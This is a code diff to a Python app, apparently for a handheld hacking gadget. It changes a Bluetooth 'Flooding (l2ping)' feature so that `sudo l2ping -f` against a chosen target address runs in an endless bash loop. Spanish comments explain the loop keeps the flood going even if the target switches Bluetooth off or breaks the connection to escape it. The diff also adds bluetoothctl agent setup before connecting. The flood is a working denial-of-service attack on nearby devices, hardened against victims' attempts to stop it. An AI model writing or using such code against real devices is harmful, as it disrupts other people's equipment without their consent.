@@ -389,6 +389,11 @@ class App(AppInterface):
             return
 
         display.text(f"Connecting to:\n{name[:12]}")
+        
+        # Enforce agent, trust and connect sequence
+        subprocess.run(["sudo", "bluetoothctl", "agent", "on"], capture_output=True)
+        subprocess.run(["sudo", "bluetoothctl", "default-agent"], capture_output=True)
+        
         res = subprocess.run(["sudo", "bluetoothctl", "connect", addr], capture_output=True, text=True)
         Log.debug(f"connect return {res.returncode}, stdout={res.stdout.strip()}, stderr={res.stderr.strip()}")
 
@@ -497,24 +502,29 @@ class App(AppInterface):
             return
 
         display.text(f"Flooding (l2ping):\n{name[:10]}\n\nPress BACK to stop")
+        
+        # Envolver l2ping en un bucle while para que resucite automáticamente 
+        # si el dispositivo objetivo desactiva brevemente su bluetooth o rompe la conexión en respuesta al flood
+        flood_script = f"while true; do sudo l2ping -f {addr}; sleep 0.1; done"
         proc = subprocess.Popen(
-            ["sudo", "l2ping", "-f", addr],
+            ["bash", "-c", flood_script],
             stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL
+            stderr=subprocess.DEVNULL,
+            preexec_fn=os.setsid # Necesario para matar el bg process tree luego
         )
 
         while not self.is_stopped():
-            key = self.wait_for_input(process=proc)
+            key = self.wait_for_input(process=None) # Ya no confiamos en que el proceso muera
             if key == "back":
                 Log.info("Stopping flood (user pressed BACK)")
                 break
-            if proc.poll() is not None:
-                Log.info("Flood process ended")
-                break
 
-        if proc.poll() is None:
-            proc.terminate()
-            subprocess.run(["sudo", "killall", "-9", "l2ping"], capture_output=True)
+        # Matar todo el árbol de bash y l2ping
+        try:
+            os.killpg(os.getpgid(proc.pid), 9)
+        except Exception:
+            pass
+        subprocess.run(["sudo", "killall", "-9", "l2ping"], capture_output=True)
 
         display.text("Flood stopped.\n\nPress BACK")
         self.wait_for_back()
